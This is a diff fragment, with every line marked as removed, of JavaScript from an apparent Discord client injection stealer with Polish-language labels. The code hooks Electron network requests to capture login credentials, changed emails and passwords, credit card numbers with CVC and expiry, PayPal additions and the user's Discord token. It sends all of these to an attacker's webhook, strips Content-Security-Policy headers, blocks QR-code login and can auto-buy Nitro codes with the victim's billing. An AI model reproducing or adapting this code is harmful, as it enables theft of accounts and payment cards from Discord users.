-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Email Zmieniony**',
-            value: `Nowy Email: **${email}**\nHasłp: **${password}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const PaypalAdded = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Paypal Dodany**',
-            value: `Czas Kupić Nitro 😩`,
-            inline: false,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Rodzaj Nitro: **${nitro}*\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Karta Bankowa Dodana**',
-            value: `Numer Karty Bankowej: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Rodzaj Nitro: **${nitro}**\nOdznaka: **${badges}**\nPłatności: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const nitroBought = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const code = await buyNitro(token);
-  const content = {
-    username: config.embed_name,
-    content: code,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Nitro kupione!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
-  hooker(content);
-};
-session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
-  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
-  updateCheck();
-});
-
-session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-  if (details.url.startsWith(config.webhook)) {
-    if (details.url.includes('discord.com')) {
-      callback({
-        responseHeaders: Object.assign(
-          {
-            'Access-Control-Allow-Headers': '*',
-          },
-          details.responseHeaders,
-        ),
-      });
-    } else {
-      callback({
-        responseHeaders: Object.assign(
-          {
-            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
-            'Access-Control-Allow-Headers': '*',
-            'Access-Control-Allow-Origin': '*',
-          },
-          details.responseHeaders,
-        ),
-      });
-    }
-  } else {
-    delete details.responseHeaders['content-security-policy'];
-    delete details.responseHeaders['content-security-policy-report-only'];
-
-    callback({
-      responseHeaders: {
-        ...details.responseHeaders,
-        'Access-Control-Allow-Headers': '*',
-      },
-    });
-  }
-});
-
-session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
-  if (details.statusCode !== 200 && details.statusCode !== 202) return;
-  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
-  const data = JSON.parse(unparsed_data);
-  const token = await execScript(
-    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
-  );
-  switch (true) {
-    case details.url.endsWith('login'):
-      login(data.login, data.password, token).catch(console.error);
-      break;
-
-    case details.url.endsWith('users/@me') && details.method === 'PATCH':
-      if (!data.password) return;
-      if (data.email) {
-        emailChanged(data.email, data.password, token).catch(console.error);
-      }
-      if (data.new_password) {
-        passwordChanged(data.password, data.new_password, token).catch(console.error);
-      }
-      break;
-
-    case details.url.endsWith('tokens') && details.method === 'POST':
-      const item = querystring.parse(unparsedData.toString());
-      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
-      break;
-
-    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
-      PaypalAdded(token).catch(console.error);
-      break;
-
-    case details.url.endsWith('confirm') && details.method === 'POST':
-      if (!config.auto_buy_nitro) return;
-      setTimeout(() => {
-        nitroBought(token).catch(console.error);
-      }, 7500);
-      break;
-
-    default:
-      break;
-  }
-});
-module.exports = require('./core.asar');
